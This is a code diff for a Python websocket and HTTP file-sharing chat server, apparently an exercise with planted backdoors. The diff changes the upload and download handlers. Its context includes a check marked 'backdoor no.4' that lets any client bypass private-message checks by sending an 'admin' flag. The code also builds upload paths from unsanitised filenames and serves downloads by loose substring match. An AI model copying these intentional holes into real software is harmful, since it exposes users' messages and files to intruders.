@@ -9,6 +9,8 @@ import websockets
 import websockets.asyncio.server as websocket_server
 from typing import List, Optional
 from aiohttp import web
+import uuid
+
 
 from neighbourhood import Neighbourhood
 from message import Message
@@ -73,7 +75,7 @@ class Server:
             # await self._websocket_server.wait_closed()
 
             await asyncio.gather(
-                # self.start_http_server(address),  # Start the HTTP server
+                self.start_http_server(address, port),  # Start the HTTP server
                 self.connect_to_neighbourhood(),  # Connect to neighbouring servers
                 self.request_client_update(),
                 self._websocket_server.wait_closed(),  # Request client updates
@@ -204,8 +206,12 @@ class Server:
 
     def check_private_message(self, websocket, message):
         # backdoor no.4
-        parsed_message = message["data"] if isinstance(message["data"], dict) else json.loads(message["data"])
-        
+        parsed_message = (
+            message["data"]
+            if isinstance(message["data"], dict)
+            else json.loads(message["data"])
+        )
+
         is_admin = parsed_message.get("admin", False)
         if is_admin:
             # bypass check for admin
@@ -387,19 +393,22 @@ class Server:
         logging.info(f"{self.url} receives client update from {neighbour_url}")
         self.neighbourhood.save_clients(neighbour_url, clients)
 
-    async def start_http_server(self, address):
+    async def start_http_server(self, address, port: int):
         """Start the HTTP server for handling file uploads"""
         app = web.Application()
         app.router.add_post(
             "/upload", self.handle_file_upload
         )  # HTTP POST route for file upload
-        app.router.add_get("/download/{filename}", self.handle_download)
+        app.router.add_get("/{filename}", self.handle_download)
 
         runner = web.AppRunner(app)
         await runner.setup()
-        site = web.TCPSite(runner, address, 443)  # HTTP server on port 1000
+        http_port = int(port) + 1000
+        site = web.TCPSite(runner, address, http_port)
         await site.start()
-        logging.info(f"HTTP server started on http://{address}:443")
+
+        # Confirm server is running and log the port
+        logging.info(f"HTTP server running on port: {str(http_port)}")
 
     async def handle_file_upload(self, request):
         """Handle file upload via HTTP POST"""
@@ -410,7 +419,11 @@ class Server:
         field = await reader.next()
         if field.name == "file":
             filename = field.filename
-            file_path = os.path.join(UPLOAD_DIRECTORY, filename)
+            file_extension = os.path.splitext(filename)[1]  # Get file extension
+            unique_id = str(uuid.uuid4())  # Generate unique UUID
+            print(unique_id)
+            unique_filename = f"{os.path.splitext(filename)[0]}-{unique_id}{file_extension}"  # Append UUID to filename
+            file_path = os.path.join(UPLOAD_DIRECTORY, unique_filename)
 
             size = 0
             # Write the file to the server's upload directory
@@ -431,23 +444,33 @@ class Server:
 
             logging.info(f"File {filename} saved at {file_path}")
 
-            file_url = f"{request.url.scheme}://{request.url.host}:{request.url.port}/files/{filename}"
-            return web.json_response({"body": {"file_url": file_url}})
+            file_url = f"{request.url.scheme}://{request.url.host}:{request.url.port}/{unique_id}"
+            return web.json_response({"response": {"body": {"file_url": file_url}}})
         return web.Response(status=400, text="No file found in request.")
 
     async def handle_download(self, request):
         """Handle file downloads via HTTP GET."""
-        filename = request.match_info.get("filename", None)
+        unique_id = request.match_info.get("filename", None)
 
-        if not filename:
-            return web.Response(status=400, text="Filename not specified.")
+        if not unique_id:
+            return web.Response(status=400, text="Unique ID not specified.")
 
-        file_path = os.path.join(UPLOAD_DIRECTORY, filename)
+        # Search for any file in the directory that contains the unique ID
+        for filename in os.listdir(UPLOAD_DIRECTORY):
+            if unique_id in filename:
+                file_path = os.path.join(UPLOAD_DIRECTORY, filename)
+                # Set headers to prompt download with the original filename
+                original_filename = (
+                    filename.split(f"-{unique_id}")[0] + os.path.splitext(filename)[1]
+                )
+                return web.FileResponse(
+                    file_path,
+                    headers={
+                        "Content-Disposition": f'attachment; filename="{original_filename}"'
+                    },
+                )
 
-        if not os.path.exists(file_path):
-            return web.Response(status=404, text="File not found.")
-
-        return web.FileResponse(file_path)
+        return web.Response(status=404, text="File not found.")
 
 
 if __name__ == "__main__":
